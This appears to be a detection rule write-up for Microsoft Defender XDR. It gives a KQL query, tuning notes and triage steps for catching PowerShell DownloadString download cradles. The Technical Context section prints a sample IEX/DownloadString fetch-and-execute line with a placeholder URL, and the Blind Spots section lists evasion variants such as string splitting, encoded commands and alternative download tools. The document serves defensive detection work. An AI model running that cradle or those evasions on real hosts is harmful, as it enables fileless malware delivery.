# PowerShell DownloadString Remote Execution

## Title
PowerShell DownloadString Remote Execution

## Goal (ADS)
Catch PowerShell pulling a script or payload straight into memory from a URL with `DownloadString()`, the classic download cradle for fileless execution.

## Description
Detects use of PowerShell's `DownloadString()` method to download content from a remote URL directly into memory, bypassing the filesystem entirely. When combined with `Invoke-Expression` (IEX), this creates a fileless execution chain where a remote script is downloaded and executed without ever touching disk — a technique commonly used in initial access, post-exploitation, and C2 stager delivery. Covers both the process command line (where the full command is visible) and PowerShell script block logging (where obfuscated or multi-stage scripts surface their decoded content). Known legitimate automation tools, cloud metadata endpoints, and package managers are excluded.

## MITRE Mapping
- Tactic: Execution
- Technique: Command and Scripting Interpreter: PowerShell
- Technique ID: T1059.001

## Strategy Abstract (ADS)
Two branches unioned together. `DeviceProcessEvents` matches powershell.exe or pwsh.exe command lines containing `DownloadString` and `http`. `DeviceEvents` with ActionType `PowerShellCommand` matches the same strings in the PowerShell command telemetry, which surfaces commands that were obfuscated or encoded on the command line. Cloud metadata addresses and Chocolatey are excluded.

## Technical Context (ADS)
The typical cradle is `IEX (New-Object Net.WebClient).DownloadString('http://…/payload.ps1')`, launched by a macro, a shortcut (LNK) file, a web shell or an attacker's interactive session. The parent process says a lot: an Office application or browser points to phishing, w3wp.exe points to a web shell, and a remote management tool points to hands-on-keyboard activity. A matching outbound connection in `DeviceNetworkEvents` shows whether the download succeeded.

## Blind Spots and Assumptions (ADS)
- Other download methods: `Invoke-WebRequest` / `iwr`, `Invoke-RestMethod` / `irm`, `Net.WebClient.DownloadData` or `DownloadFile`, `Start-BitsTransfer`, and non-PowerShell tools such as certutil or curl.
- Obfuscation that splits the string on the command line (`'Down'+'loadString'`, backticks, character codes). The command-telemetry branch only catches it if the decoded command is recorded.
- Base64-encoded commands (`-enc`) are only visible through the command-telemetry branch.
- PowerShell hosted inside another process (powershell_ise.exe, custom runspaces loading System.Management.Automation.dll).
- URLs without `http` (for example UNC paths or `ftp://`).
- Assumes PowerShell command telemetry is reaching Defender XDR for the host.

## False Positives (ADS)
- Administrator and deployment scripts that bootstrap from an internal web server.
- Package managers and installers other than Chocolatey (for example Scoop, vendor install one-liners).
- Monitoring or management agents that fetch configuration scripts on a schedule.

## Severity
- High
- Why: A download cradle into memory is a high-value execution signal; legitimate uses are few and usually attributable to known admin tooling.

## Frequency / Lookback
- Run frequency: Scheduled
- Lookback period: 4 hours

## KQL Query
```kusto
// Detect PowerShell DownloadString() method usage - commonly used to download and execute malicious scripts
// Covers both process creation command line and script block logging
// Excludes known legitimate automation tools and cloud metadata endpoints

union
(
    DeviceProcessEvents
    | where ActionType == "ProcessCreated"
    | where FileName in~ ("powershell.exe", "pwsh.exe")
    | where ProcessCommandLine contains "DownloadString"
    | where ProcessCommandLine contains "http"
    | where not (ProcessCommandLine has_any (dynamic(["168.63.129.16", "169.254.169.254", "chocolatey"])))
    | project
        DeviceId,
        Timestamp,
        ReportId,
        DeviceName,
        AccountName,
        InitiatingProcessFileName,
        InitiatingProcessCommandLine,
        FileName,
        ProcessCommandLine,
        EventType = "ProcessCreated"
),
(
    DeviceEvents
    | where ActionType == "PowerShellCommand"
    | where AdditionalFields has "DownloadString"
    | where AdditionalFields has "http"
    | where not (AdditionalFields has_any (dynamic(["168.63.129.16", "169.254.169.254"])))
    | project
        DeviceId,
        Timestamp,
        ReportId,
        DeviceName,
        AccountName = "",
        InitiatingProcessFileName,
        InitiatingProcessCommandLine,
        FileName = "",
        ProcessCommandLine = tostring(AdditionalFields),
        EventType = "ScriptBlockLogging"
)
| order by Timestamp desc
```

## Alert Settings
- Title (max 3 variables): PowerShell DownloadString Detected on {{DeviceName}} via {{InitiatingProcessFileName}}
- Description (max 3 variables): PowerShell's DownloadString() method was detected initiated by {{InitiatingProcessFileName}}. Account: {{AccountName}}. Command: {{ProcessCommandLine}}
- Custom Details:
  - EventType: ProcessCreated / ScriptBlockLogging
  - CommandLine: ProcessCommandLine
  - ParentProcess: InitiatingProcessFileName

## Entity Mapping
- Account: AccountName
- Host: DeviceName
- IP: N/A
- File: FileName
- Process: ProcessCommandLine

## Validation (ADS)
| Date | Method | Environment | Result |
|------|--------|-------------|--------|
| 2026-09-15 | Atomic Red Team | Windows test device, Defender XDR | Alert raised |

## Recommended Actions
- Triage playbook: [Suspicious PowerShell or LOLBin Execution](https://oluwatosinogunjimi.github.io/soc-triage-trees/#suspicious-powershell)
- Review `ProcessCommandLine` or script block content immediately — extract the full URL and check it against threat intelligence; the domain and path often identify the malware family or C2 framework.
- Check `InitiatingProcessFileName` — a document reader, browser, or email client parent confirms a phishing-initiated execution chain; `w3wp.exe` confirms web shell execution.
- Search `DeviceNetworkEvents` on the same `DeviceId` around the same `Timestamp` for the outbound connection to determine whether the download succeeded.
- If `EventType` is `ScriptBlockLogging`, correlate with `DeviceProcessEvents` on the same `DeviceId` for the full PowerShell execution context.
- Hunt for `IEX` / `Invoke-Expression` in the same command line or script block — combined with `DownloadString`, this confirms fileless execution and should be treated as a confirmed incident pending further evidence.

## Tuning Notes
| Date | Change | Reason |
|------|--------|--------|
| 2026-03-25 | Initial version | Baseline |
| 2026-09-15 | Added script block logging branch, exclusions for cloud metadata endpoints and package managers, tightened lookback to 4 hours, expanded recommended actions | Validated in Defender XDR; reduce false positives and cover obfuscated/multi-stage execution |
